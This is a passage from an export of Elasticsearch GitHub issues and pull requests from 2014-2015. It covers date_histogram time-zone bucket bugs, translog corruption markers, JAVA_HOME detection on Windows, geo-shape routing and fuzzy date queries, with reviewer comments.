</description><key id="42414945">7675</key><summary>Refactor copy headers mechanism to not require a client factory</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/javanna/following{/other_user}', u'events_url': u'https://api.github.com/users/javanna/events{/privacy}', u'organizations_url': u'https://api.github.com/users/javanna/orgs', u'url': u'https://api.github.com/users/javanna', u'gists_url': u'https://api.github.com/users/javanna/gists{/gist_id}', u'html_url': u'https://github.com/javanna', u'subscriptions_url': u'https://api.github.com/users/javanna/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/832460?v=4', u'repos_url': u'https://api.github.com/users/javanna/repos', u'received_events_url': u'https://api.github.com/users/javanna/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/javanna/starred{/owner}{/repo}', u'site_admin': False, u'login': u'javanna', u'type': u'User', u'id': 832460, u'followers_url': u'https://api.github.com/users/javanna/followers'}</assignee><reporter username="">javanna</reporter><labels><label>:Internal</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-10T13:54:54Z</created><updated>2015-06-07T12:03:56Z</updated><resolved>2014-09-11T11:20:01Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-10T14:56:25Z" id="55127613">except of the one set / immutable set issue this LGTM much better than before
</comment><comment author="spinscale" created="2014-09-10T15:06:59Z" id="55129291">LGTM, waaaaaay more readable
</comment><comment author="javanna" created="2014-09-10T15:15:57Z" id="55130661">Pushed a new commit to address comments
</comment><comment author="s1monw" created="2014-09-10T20:11:57Z" id="55175532">@javanna my last comment was bogus - the builder that I was referring to is the `ImmutableMap.Builder`, sorry for the confusion. Yet, I think you last commit is a perf issue since now we rebuild a map on each get call which is executed for each request. It will also in the case of adding the same key multiple times just append to an array inside the builder which can consume unneeded memory. Why don't we do this in the setter and rebuild the map each time we add headers?
</comment><comment author="javanna" created="2014-09-10T20:22:02Z" id="55177019">&gt; Why don't we do this in the setter and rebuild the map each time we add headers?

Isn't that what `CopyOnWriteArraySet` does? I'm missing what the advantage would be for using `ImmutableSet` here.
</comment><comment author="s1monw" created="2014-09-11T06:56:24Z" id="55226985">&gt; Isn't that what `CopyOnWriteArraySet` does? I'm missing what the advantage would be for using `ImmutableSet` here.

sorry that I am not expressing myself clear enough. The `CopyOnWriteArraySet` does copy on write but we want an immutable set so if you return the instance from `relevantHeaders()` `CopyOnWriteArraySet` will be mutable outside of the `RestController`, makes sense?
</comment><comment author="javanna" created="2014-09-11T09:04:41Z" id="55238180">&gt; we want an immutable set so if you return the instance from relevantHeaders() CopyOnWriteArraySet will be mutable outside of the RestController, makes sense?

Makes sense, I had missed the public getter that exposed the set. I pushed a new commit that should fix this.
</comment><comment author="uboness" created="2014-09-11T10:31:17Z" id="55246437">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Loading wrong configuration files</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7674</link><project id="" key="" /><description>After an update via yum the following error occurs:

org.elasticsearch.common.settings.SettingsException: Failed to load settings from [file:/etc/elasticsearch/logging.yml.rpmnew]

That is strange and Elasticsearch shouldn't load *.rpmnew files.

touch /etc/elasticsearch/logging.yml.foobar

org.elasticsearch.common.settings.SettingsException: Failed to load settings from [file:/etc/elasticsearch/logging.yml.foobar]

Cheers
Jonny
</description><key id="42411579">7674</key><summary>Loading wrong configuration files</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">bloonix</reporter><labels /><created>2014-09-10T13:21:22Z</created><updated>2014-09-10T13:25:31Z</updated><resolved>2014-09-10T13:25:31Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="bloonix" created="2014-09-10T13:25:31Z" id="55114205">Seems to be fixed in #7457
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Strange bucket for date_histogram with negative post_zone and zero min_doc_count</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7673</link><project id="" key="" /><description>I sent following request to my elasticsearch 1.3.2 server `http://localhost:9200/payment_prod/2002/_search?search_type=count` with negative `post_zone` and `pre_zone`:

``` json
{
    "query" : {
        "filtered" : {
            "query" : {
                "match_all" : {}
            }
        }
    },
    "aggs" : {
        "by_time" : {
            "date_histogram" : {
                "field" : "date",
                "interval" : "month",
                "post_zone" : -2,
                "pre_zone" : -2,
                "min_doc_count" : 0,
                "format" : "yyyy-MM-dd--HH:mm:ss.SSSZ"
            }
        }
    }
}
```

It seems to me that I shouldn't get the bucket 2013-07-30--22:00:00.000+0000 in the response.

``` json
{
    "took" : 105,
    "timed_out" : false,
    "_shards" : {
        "total" : 5,
        "successful" : 5,
        "failed" : 0
    },
    "hits" : {
        "total" : 4018428,
        "max_score" : 0.0,
        "hits" : []
    },
    "aggregations" : {
        "by_time" : {
            "buckets" : [{
                    "key_as_string" : "2013-06-30--22:00:00.000+0000",
                    "key" : 1372629600000,
                    "doc_count" : 235258
                }, {
                    "key_as_string" : "2013-07-30--22:00:00.000+0000",
                    "key" : 1375221600000,
                    "doc_count" : 0
                }, {
                    "key_as_string" : "2013-07-31--22:00:00.000+0000",
                    "key" : 1375308000000,
                    "doc_count" : 341928
                }, {
                    "key_as_string" : "2013-08-31--22:00:00.000+0000",
                    "key" : 1377986400000,
                    "doc_count" : 330148
                }
            ]
        }
    }
}
```

With a small update on the request, post and pre zone with positive values, `http://localhost:9200/payment_prod/2002/_search?search_type=count`:

``` json
{
    "query" : {
        "filtered" : {
            "query" : {
                "match_all" : {}
            }
        }
    },
    "aggs" : {
        "by_time" : {
            "date_histogram" : {
                "field" : "date",
                "interval" : "month",
                "post_zone" : 2,
                "pre_zone" : 2,
                "min_doc_count" : 0,
                "format" : "yyyy-MM-dd--HH:mm:ss.SSSZ"
            }
        }
    }
}
```

In such case, response seems valid for me without strange bucket:

``` json
{
    "took" : 87,
    "timed_out" : false,
    "_shards" : {
        "total" : 5,
        "successful" : 5,
        "failed" : 0
    },
    "hits" : {
        "total" : 4018428,
        "max_score" : 0.0,
        "hits" : []
    },
    "aggregations" : {
        "by_time" : {
            "buckets" : [{
                    "key_as_string" : "2013-07-01--02:00:00.000+0000",
                    "key" : 1372644000000,
                    "doc_count" : 233384
                }, {
                    "key_as_string" : "2013-08-01--02:00:00.000+0000",
                    "key" : 1375322400000,
                    "doc_count" : 341918
                }
            ]
        }
    }
```

In fact problem occurs with post_zone &lt; 0 and min_doc_count = 0. Without one of those predicates, result seems more reliable.

Am I  wrong or is there a problem with elasticsearch post_zone management?
</description><key id="42398139">7673</key><summary>Strange bucket for date_histogram with negative post_zone and zero min_doc_count</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/jpountz/following{/other_user}', u'events_url': u'https://api.github.com/users/jpountz/events{/privacy}', u'organizations_url': u'https://api.github.com/users/jpountz/orgs', u'url': u'https://api.github.com/users/jpountz', u'gists_url': u'https://api.github.com/users/jpountz/gists{/gist_id}', u'html_url': u'https://github.com/jpountz', u'subscriptions_url': u'https://api.github.com/users/jpountz/subscriptions', u'avatar_url': u'https://avatars2.githubusercontent.com/u/299848?v=4', u'repos_url': u'https://api.github.com/users/jpountz/repos', u'received_events_url': u'https://api.github.com/users/jpountz/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/jpountz/starred{/owner}{/repo}', u'site_admin': False, u'login': u'jpountz', u'type': u'User', u'id': 299848, u'followers_url': u'https://api.github.com/users/jpountz/followers'}</assignee><reporter username="">glelouarn</reporter><labels><label>:Aggregations</label><label>bug</label></labels><created>2014-09-10T10:21:14Z</created><updated>2015-03-17T18:56:35Z</updated><resolved>2015-03-17T18:56:35Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-10T14:39:17Z" id="55124637">thanks for the report @glelouarn - we'll take a look 
</comment><comment author="glelouarn" created="2014-12-22T10:55:41Z" id="67824877">Hi work on it and initialized the pull request https://github.com/elasticsearch/elasticsearch/pull/9029
</comment><comment author="cbuescher" created="2015-02-05T12:11:35Z" id="73036699">I encountered similar problems while working on #9062. The problem is in the way Rounding.nextRoundingValue() is used when adding empty buckets in InternalHistogram.addEmptyBuckets(). The assumtion there is that when adding time durations (like 1M) to the key of an existing (non-empty) bucket to fill the histogram with empty buckets one always ends up with the key of the next non-empty bucket.

e.g. in the example about one would expect

nextRoundingValue("2013-06-30--22:00:00.000+0000") =&gt; "2013-07-31--22:00:00.000+0000"
(well, that is 2hour before the 1st of next month)

Internally we use DurationField.add() from Joda-Time, but that works in a slightly different way (at least for months), e.g. if you start with 2014-01-31T22:00:00.000Z and then add 1month durations consecutively one gets:

2014-01-31T22:00:00.000Z + month -&gt; 2014-02-28T22:00:00.000Z
2014-02-28T22:00:00.000Z + month -&gt; 2014-03-28T22:00:00.000Z
2014-03-28T22:00:00.000Z + month -&gt; 2014-04-28T22:00:00.000Z
etc...

but the following rounded non-empty buckets will have keys 2014-03-31T22:00:00.000Z, 2014-04-30T22:00:00.000Z etc...

The time-zone offset is just one way to run into this. I think that any offset (could be positive as well) that makes bucket keys lie in the range of day_of_month in 28-31 will likely result in the same glitch, at least for DateTimeUnit.MONTH_OF_YEAR and above. 
</comment><comment author="cbuescher" created="2015-03-02T10:24:33Z" id="76688306">This is fixed on 1.4 and 1.x with https://github.com/elasticsearch/elasticsearch/pull/9790 I think.
</comment><comment author="cbuescher" created="2015-03-17T18:56:35Z" id="82527795">The fix for this will be in the next release (either 1.4.5 or 1.5).
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>[plugin] support SNAPSHOT version download from sonatype repo</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7672</link><project id="" key="" /><description>For now, when we use the plugin manager to install a JVM plugin, we download it from:
- elasticsearch download service (official plugins)
- maven central (community based plugins)

Sometime developers would like to share a SNAPSHOT version of a plugin. Artifacts are in that case most of the time available on [Sonatype](https://oss.sonatype.org/) repository.

Plugin manager should try to download the latest SNAPSHOT version available using Sonatype repo in addition to Maven central.

So the following could work:

```
bin/plugin install org.elasticsearch/elasticsearch-analysis-icu/3.0.0-SNAPSHOT
```
</description><key id="42397966">7672</key><summary>[plugin] support SNAPSHOT version download from sonatype repo</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/tlrx/following{/other_user}', u'events_url': u'https://api.github.com/users/tlrx/events{/privacy}', u'organizations_url': u'https://api.github.com/users/tlrx/orgs', u'url': u'https://api.github.com/users/tlrx', u'gists_url': u'https://api.github.com/users/tlrx/gists{/gist_id}', u'html_url': u'https://github.com/tlrx', u'subscriptions_url': u'https://api.github.com/users/tlrx/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/642733?v=4', u'repos_url': u'https://api.github.com/users/tlrx/repos', u'received_events_url': u'https://api.github.com/users/tlrx/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/tlrx/starred{/owner}{/repo}', u'site_admin': False, u'login': u'tlrx', u'type': u'User', u'id': 642733, u'followers_url': u'https://api.github.com/users/tlrx/followers'}</assignee><reporter username="">dadoonet</reporter><labels><label>:Plugins</label><label>feature</label></labels><created>2014-09-10T10:18:57Z</created><updated>2015-11-21T18:47:23Z</updated><resolved>2015-11-21T18:47:23Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="dadoonet" created="2015-06-04T07:56:57Z" id="108771795">@tlrx I'm assigning this one to you. Could you add this once your work on the plugin manager will be pulled in?
</comment><comment author="clintongormley" created="2015-11-21T18:47:23Z" id="158671681">Closing - no plans on supporting this
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add that children aggregation is coming in 1.4.0</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7671</link><project id="" key="" /><description>I had a syntax error because I tried the `children` aggregation on my deployed instance of ElasticSearch 1.3.2, and I had to look in the source repository to understand where it was coming from.

Better to avoid that hassle for other people.
</description><key id="42393427">7671</key><summary>Add that children aggregation is coming in 1.4.0</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">jhominal</reporter><labels><label>docs</label></labels><created>2014-09-10T09:24:15Z</created><updated>2014-09-25T17:46:29Z</updated><resolved>2014-09-25T17:46:29Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="martijnvg" created="2014-09-10T09:34:41Z" id="55091972">@jhominal Good catch, can you to sign the CLA so that I can get it merged in
http://www.elasticsearch.org/contributor-agreement/
</comment><comment author="clintongormley" created="2014-09-25T17:46:29Z" id="56856298">Closed by 49df0d0fa6bb7afdcf884301731f099b9654919b
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>nice try to detect JAVA_HOME</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7670</link><project id="" key="" /><description>it's boring to set up JAVA_HOME on Windows.
in most cases we can guess it.
</description><key id="42392578">7670</key><summary>nice try to detect JAVA_HOME</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">chipitsine</reporter><labels><label>:Packaging</label></labels><created>2014-09-10T09:13:50Z</created><updated>2016-02-14T23:19:48Z</updated><resolved>2014-12-05T10:31:03Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-10T14:33:58Z" id="55123766">Thanks for the PR @chipitsine 

@electrical please could you take a look at it?
</comment><comment author="electrical" created="2014-09-10T15:28:31Z" id="55132655">Im not so into windows.
@Mpdreamz what do you think of this?
</comment><comment author="Mpdreamz" created="2014-09-11T09:42:15Z" id="55241972">Couple of things to note `reg query` does not find these values if I run elasticsearch.bat without admin rights:

```
ERROR: The system was unable to find the specified registry key or value.
ERROR: The system was unable to find the specified registry key or value.
```

This could be easily fixed by doing something like this though
http://stackoverflow.com/questions/7985755/how-to-detect-if-cmd-is-running-as-administrator-has-elevated-privileges

Another place to check for `JAVA_HOME` would be a JDK installation:

`HKEY_LOCAL_MACHINE\SOFTWARE\JavaSoft\Java Development Kit`

I do like the idea of automatically finding `JAVA_HOME` but wonder if it might cause problems/confussion later on when/if folks forget to run as admin? 

In the current situation it altleast fails consistently on the first run. thoughts @electrical?
</comment><comment author="chipitsine" created="2014-09-11T10:05:22Z" id="55244139">ok, I have a deeper look into it.
</comment><comment author="electrical" created="2014-09-11T10:28:51Z" id="55246246">With the Linux scripts we try to find the java install based on some pre-defined paths.
we could do the same here.

if JAVA_HOME is not set try to find it at some different locations.
If we can't find it ( not installed ) or not running as Admin give an error back that no java is found?
</comment><comment author="chipitsine" created="2014-09-13T18:47:13Z" id="55502940">I tried various ways to detect UAC, seems "net session" is the best.

well, I didn't see when "HKEY_LOCAL_MACHINE\SOFTWARE\JavaSoft\Java Development Kit" is set, but no jre is installed. Usually jre is there.

can you, please,  describe situation, that sdk is installed, but no jre ? how did you achive that ?

https://github.com/chipitsine/elasticsearch/blob/afdda3db282d4a4020c646504869123bf9fe5243/bin/elasticsearch.bat - the latest version (not sure about error message, it would be great if some native speaker will translate it to English)
</comment><comment author="chipitsine" created="2014-09-16T03:39:08Z" id="55691127">up
</comment><comment author="chipitsine" created="2014-09-17T03:25:40Z" id="55844513">up
</comment><comment author="chipitsine" created="2014-09-18T02:46:29Z" id="55988821">up
</comment><comment author="electrical" created="2014-09-18T08:51:19Z" id="56011697">@Mpdreamz could you take an other look at this?
</comment><comment author="chipitsine" created="2014-09-18T12:13:36Z" id="56029751">output of "REG QUERY" will result in errors as well if no JVM installed. probably, we should supress those errors at all  with 2&gt;NUL (I do not want to make very complicated script which can detect all possible situations, I'd prefer small but readable script).

also, I tried to put  UAC check inside "IF "%JAVA_HOME%" == "" ( ...", it seems cmd does not like nested if, there was an error. So, I separated those checks.

I agree on your suggestion about error message.
</comment><comment author="s1monw" created="2014-12-05T10:31:03Z" id="65772167">this has been stalled for a long time. I am closing this for now
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Allow 'copy_to' to copy values between fields of a multi_field setup</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7669</link><project id="" key="" /><description>The 'copy_to' parameter allows to copy values from one field into another.
Unfortunately that doesn't work for fields  described by the 'fields' parameter:
So something like:

```
{
  "tweet" : {
    "properties" : {
      "name" : {
        "type" : "string",
        "fields" : {
          "name" : {"type" : "string", "index" : "not_analyzed"},
          "searchable" : {"type" : "string", "analyzer" : "someNgramAnalyzer", "copy_to": "name"}
        }
      }
    }
  }
}
```

Wont work.
Please allow this :)
</description><key id="42391272">7669</key><summary>Allow 'copy_to' to copy values between fields of a multi_field setup</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">mschirmacher</reporter><labels /><created>2014-09-10T08:57:13Z</created><updated>2014-09-10T18:24:11Z</updated><resolved>2014-09-10T14:32:33Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-10T14:32:33Z" id="55123552">@mschirmacher What you are trying to do here doesn't make any sense.  The _value_  is copied to another field, not the tokens.  So copying a sub-field to the main field would just copy the same value that it already has.

This is the same as for the `_all` field.
</comment><comment author="mschirmacher" created="2014-09-10T18:24:11Z" id="55159274">@clintongormley Oh this explains so much, thanks for clarification
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Translog entry markers</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7668</link><project id="" key="" /><description>In the case of a corrupted translog (whether by OOME, bit corruption or manual intervention) it would be nice if we had a way of marking the beginning and/or end of each operation (0xdeadbeef perhaps? :)). Then when we were reading the translog and an unknown exception was encountered, we could skip to the next marker and write the corrupted portion to a separate file. We could then (optionally) continue reading the rest of the translog after the corruption.
</description><key id="42386201">7668</key><summary>Translog entry markers</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">dakrone</reporter><labels /><created>2014-09-10T07:44:32Z</created><updated>2015-06-03T22:46:22Z</updated><resolved>2015-06-03T22:46:21Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="ppf2" created="2015-02-10T21:42:05Z" id="73790004">+1 great idea (been seeing a few translog corruption issues in the field and when this happens the shard gets stuck in initializing state).
</comment><comment author="rjernst" created="2015-02-11T01:19:52Z" id="73819212">How would you know that byte sequence doesn't happen to appear in translog entries (good or bad)? 
</comment><comment author="rmuir" created="2015-02-11T12:23:18Z" id="73872995">I don't understand how silently losing data is an improvement. The existing exception-catching in this translog is already broken.

If the thing is corrupt, we should just throw an exception.
</comment><comment author="s1monw" created="2015-06-03T20:04:11Z" id="108597851">I think with all the improvements on translog in 2.0 we can close this sicne we now validate checksums ahead of time etc?
</comment><comment author="dakrone" created="2015-06-03T22:46:21Z" id="108634897">Yep, closing this.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Closes #7663 (add routing for pre-indexed shapes)</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7667</link><project id="" key="" /><description>As discussed early in #7663, there no way to provide routing information for pre-indexed shape in GeoShape filters and queries. This PR contains fixes for this issue:
Adds optional `routing` parameter to `indexed_shape` object in GeoShape builder/parser for filter and query.
Adds test for mandatory-routed pre-indexed GeoShape search.
Adds `routing` parameter description into geo_shape filter asciidoc.
</description><key id="42382761">7667</key><summary>Closes #7663 (add routing for pre-indexed shapes)</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/martijnvg/following{/other_user}', u'events_url': u'https://api.github.com/users/martijnvg/events{/privacy}', u'organizations_url': u'https://api.github.com/users/martijnvg/orgs', u'url': u'https://api.github.com/users/martijnvg', u'gists_url': u'https://api.github.com/users/martijnvg/gists{/gist_id}', u'html_url': u'https://github.com/martijnvg', u'subscriptions_url': u'https://api.github.com/users/martijnvg/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/580421?v=4', u'repos_url': u'https://api.github.com/users/martijnvg/repos', u'received_events_url': u'https://api.github.com/users/martijnvg/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/martijnvg/starred{/owner}{/repo}', u'site_admin': False, u'login': u'martijnvg', u'type': u'User', u'id': 580421, u'followers_url': u'https://api.github.com/users/martijnvg/followers'}</assignee><reporter username="">helllamer</reporter><labels /><created>2014-09-10T06:45:34Z</created><updated>2015-03-19T10:19:04Z</updated><resolved>2015-01-16T15:14:42Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-10T14:27:24Z" id="55122808">thanks for the PR @helllamer - we'll take a look at it.
</comment><comment author="colings86" created="2014-10-10T13:32:57Z" id="58655698">@helllamer thanks for the PR. It looks good to me so I will get another review and try to get it merged in for you.
</comment><comment author="clintongormley" created="2014-10-16T09:53:57Z" id="59338886">@martijnvg could you review this one please
</comment><comment author="martijnvg" created="2015-01-06T17:12:40Z" id="68896132">@helllamer Your change looks good, would you like to turn the PR into a single commit and rebase with master? If you don't have time for this now then I will do it in a couple of days. Sorry that it took so long to respond!
</comment><comment author="helllamer" created="2015-01-06T17:52:48Z" id="68902978">Hi, Martijn. I,m on newyear holidays, far away from keyboard. Cannot help you this week...

Martijn van Groningen notifications@github.com &#1087;&#1080;&#1096;&#1077;&#1090;:

&gt; @helllamer Your change looks good, would you like to turn the PR into a
&gt; single commit and rebase with master? If you don't have time for this
&gt; now then I will do it in a couple of days. Sorry that it took so long
&gt; to respond!
&gt; 
&gt; ---
&gt; 
&gt; Reply to this email directly or view it on GitHub:
&gt; https://github.com/elasticsearch/elasticsearch/pull/7667#issuecomment-68896132
</comment><comment author="martijnvg" created="2015-01-12T12:31:07Z" id="69563258">@helllamer No problem at all. If happen to have some time this week then that would be great.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Fuzzy query: Date/Time does not support y (Year) or M (month)</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7666</link><project id="" key="" /><description>Executing a Fuzzy query on a date field with fuzziness set to y or M fails. Documentation here states that this should be possible:

http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/query-dsl-fuzzy-query.html#_numeric_and_date_fields

http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/common-options.html#fuzziness

http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/common-options.html#time-units

Reproducible using below:

```
curl -XDELETE localhost:9200/test1

curl -XPOST localhost:9200/test1/doc/1 -d '{
  "dt": "2012-05-23T13:56:00"
}'

curl -XPOST localhost:9200/test1/_refresh

curl -XGET localhost:9200/test1/_search?pretty -d'
{
  "query": {
    "fuzzy": {
      "dt": {
        "value": "2012-05-23T13:56:00",
        "fuzziness": "1y"
      }
    }
  }
}'

curl -XGET localhost:9200/test1/_search?pretty -d'
{
  "query": {
    "fuzzy": {
      "dt": {
        "value": "2012-05-23T13:56:00",
        "fuzziness": "1M"
      }
    }
  }
}'
```

We just need to fix TimeValue.parseTimeValue() to include "M" and "y".
</description><key id="42350175">7666</key><summary>Fuzzy query: Date/Time does not support y (Year) or M (month)</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">bly2k</reporter><labels><label>:Query DSL</label><label>adoptme</label><label>enhancement</label><label>low hanging fruit</label></labels><created>2014-09-09T20:53:59Z</created><updated>2016-06-13T13:14:44Z</updated><resolved>2016-06-13T13:14:44Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-10T14:22:56Z" id="55122126">Related to #7066 
</comment><comment author="cfontes" created="2014-09-18T07:34:50Z" id="56004479">I can addopt this one. I've found the place to fix this but I have a doubt.

Can I define a Month as 30 days and a year as 365 days ?

The year I think is pretty OK to do that. But a month is a some what loose definition. What do you think?
</comment><comment author="dadoonet" created="2014-09-18T07:37:47Z" id="56004730">Actually it does not really work as a year could be 366 days as well. 
</comment><comment author="cfontes" created="2014-09-18T07:49:21Z" id="56005710">Yes, I had that in mind. But I find it way less problematic then defining a 28 days month. That's why I said I think a 365 year doesn't look that bad.

Using 1y = current year length and 1m = current month looks weird too. So I don't have a better option right now than arbitrarily choosing one number from the acceptable range and documenting it.
</comment><comment author="cfontes" created="2014-09-18T07:59:36Z" id="56006544">Looks like this chat kind of already happened in #6580...
</comment><comment author="dadoonet" created="2014-09-18T08:01:36Z" id="56006697">Yeah. And fro the record there as well: #2473 :)
</comment><comment author="cfontes" created="2014-09-18T08:14:33Z" id="56007931">This looks like one of those requisites that will take a long time to get defined. It has valid arguments for most cases and it's a use case that is useful enough for it to keep showing up.

Maybe all of this issues should be closed and the documents updated to remove those options.
</comment><comment author="cfontes" created="2014-09-19T08:01:38Z" id="56148050">@dadoonet and @clintongormley what about something like this #7796?

I used Joda methods to operate on the date passed by the user. Like this we could handle those cases in a reasonable way (at least it looks reasonable to me) even #2473 could work.

This is just a POC to see if you agree with it. If so I can polish it a bit.

p.s: all tests are passing, and I manually tested it and it works fine.
</comment><comment author="clintongormley" created="2014-09-25T18:50:41Z" id="56865443">@cfontes thanks for the PR - I've marked it for review 
</comment><comment author="jpountz" created="2016-06-13T13:14:44Z" id="225576918">Support for fuzzy queries on numeric/date fields has been removed. Closing.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Test: use local random instance rather than thread local version</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7665</link><project id="" key="" /><description>This influences reprocucibility dramatically since it modifies the
test random sequence while it should just use the private random
instance.
</description><key id="42321251">7665</key><summary>Test: use local random instance rather than thread local version</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">s1monw</reporter><labels><label>test</label><label>v1.2.5</label><label>v1.3.3</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-09T15:49:36Z</created><updated>2015-06-07T11:46:38Z</updated><resolved>2014-09-09T16:36:51Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="javanna" created="2014-09-09T16:34:19Z" id="54998117">LGTM, thanks @s1monw 
</comment><comment author="brwe" created="2014-09-09T16:36:32Z" id="54998448">great! thanks for fixing so quickly!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Fixed explanation for GaussDecayFunction</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7664</link><project id="" key="" /><description>The explanation now gives the correct value instead of the negative.
</description><key id="42320221">7664</key><summary>Fixed explanation for GaussDecayFunction</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/brwe/following{/other_user}', u'events_url': u'https://api.github.com/users/brwe/events{/privacy}', u'organizations_url': u'https://api.github.com/users/brwe/orgs', u'url': u'https://api.github.com/users/brwe', u'gists_url': u'https://api.github.com/users/brwe/gists{/gist_id}', u'html_url': u'https://github.com/brwe', u'subscriptions_url': u'https://api.github.com/users/brwe/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/4320215?v=4', u'repos_url': u'https://api.github.com/users/brwe/repos', u'received_events_url': u'https://api.github.com/users/brwe/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/brwe/starred{/owner}{/repo}', u'site_admin': False, u'login': u'brwe', u'type': u'User', u'id': 4320215, u'followers_url': u'https://api.github.com/users/brwe/followers'}</assignee><reporter username="">phjardas</reporter><labels><label>bug</label></labels><created>2014-09-09T15:40:00Z</created><updated>2014-09-18T14:17:12Z</updated><resolved>2014-09-12T16:17:40Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-09T16:46:10Z" id="54999757">Hi @phjardas 

Thanks for the fix. Please could I ask to you to sign the CLA: http://www.elasticsearch.org/contributor-agreement/
